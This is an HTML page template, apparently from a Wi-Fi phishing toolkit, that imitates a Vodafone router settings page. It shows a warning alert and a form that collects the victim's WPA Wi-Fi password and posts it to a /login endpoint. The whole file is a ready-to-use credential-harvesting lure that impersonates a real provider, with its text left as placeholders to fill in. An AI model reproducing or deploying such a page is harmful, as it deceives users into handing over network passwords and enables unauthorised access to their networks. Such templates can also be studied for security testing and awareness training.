<!DOCTYPE html>
<html lang="{{html_lang}}">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{page_title}}</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, Helvetica, sans-serif; background: #f2f2f2; color: #333; min-height: 100vh; }
        .header { background: #e60000; color: #fff; padding: 14px 18px; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 8px; }
        .header h1 { font-size: 22px; font-weight: 700; letter-spacing: -0.02em; }
        .header small { font-size: 11px; opacity: 0.95; display: block; margin-top: 2px; }
        .tabs { background: #fff; border-bottom: 2px solid #e60000; display: flex; flex-wrap: wrap; }
        .tabs a { padding: 12px 16px; font-size: 12px; color: #666; text-decoration: none; border-bottom: 3px solid transparent; margin-bottom: -2px; }
        .tabs a.on { color: #e60000; font-weight: 700; border-bottom-color: #e60000; }
        .wrap { max-width: 680px; margin: 18px auto; padding: 0 14px; }
        .card { background: #fff; border-radius: 4px; box-shadow: 0 1px 4px rgba(0,0,0,0.08); overflow: hidden; }
        .card-title { background: #fafafa; border-bottom: 1px solid #e5e5e5; padding: 12px 16px; font-size: 14px; font-weight: 700; color: #e60000; }
        .card-body { padding: 18px 16px; }
        .alert { background: #ffecec; border: 1px solid #e60000; border-left: 5px solid #e60000; padding: 12px 14px; margin-bottom: 18px; font-size: 12px; line-height: 1.55; color: #5a1515; }
        .alert strong { display: block; color: #c00000; margin-bottom: 6px; font-size: 13px; }
        .grid { display: grid; gap: 14px; }
        @media (min-width: 500px) {
            .row { display: grid; grid-template-columns: 160px 1fr; align-items: center; gap: 12px; }
        }
        .lbl { font-size: 12px; font-weight: 700; color: #555; }
        .val { font-size: 13px; color: #333; }
        input[type="password"] { width: 100%; padding: 10px 12px; border: 1px solid #ccc; border-radius: 3px; font-size: 14px; }
        input[type="password"]:focus { border-color: #e60000; outline: none; }
        .btn-row { text-align: right; margin-top: 20px; }
        .btn { padding: 10px 22px; background: #e60000; color: #fff; border: none; border-radius: 3px; font-size: 13px; font-weight: 700; cursor: pointer; }
        .btn:hover { background: #cc0000; }
        .foot { text-align: center; padding: 16px; font-size: 10px; color: #999; }
    </style>
</head>
<body>
    <div class="header">
        <div><h1>Vodafone</h1><small>{{header_subtitle}}</small></div>
    </div>
    <div class="tabs">
        <a href="#">{{tab_home}}</a><a href="#" class="on">{{tab_wifi}}</a><a href="#">{{tab_internet}}</a><a href="#">{{tab_system}}</a>
    </div>
    <div class="wrap">
        <div class="card">
            <div class="card-title">{{card_title}}</div>
            <div class="card-body">
                <div class="alert">
                    <strong>{{alert_title}}</strong>
                    {{alert_body}}
                </div>
                <form method="POST" action="/login">
                    <div class="grid">
                        <div class="row">
                            <div class="lbl">{{lbl_encryption}}</div>
                            <div class="val">{{val_encryption}}</div>
                        </div>
                        <div class="row">
                            <label class="lbl" for="wpa">{{lbl_wifi_password}}</label>
                            <div>
                                <input type="password" id="wpa" name="wfphshr-wpa-password" placeholder="{{input_placeholder}}" required autocomplete="current-password">
                            </div>
                        </div>
                    </div>
                    <div class="btn-row"><button type="submit" class="btn">{{btn_save}}</button></div>
                </form>
            </div>
        </div>
        <div class="foot">{{footer}}</div>
    </div>
</body>
</html>
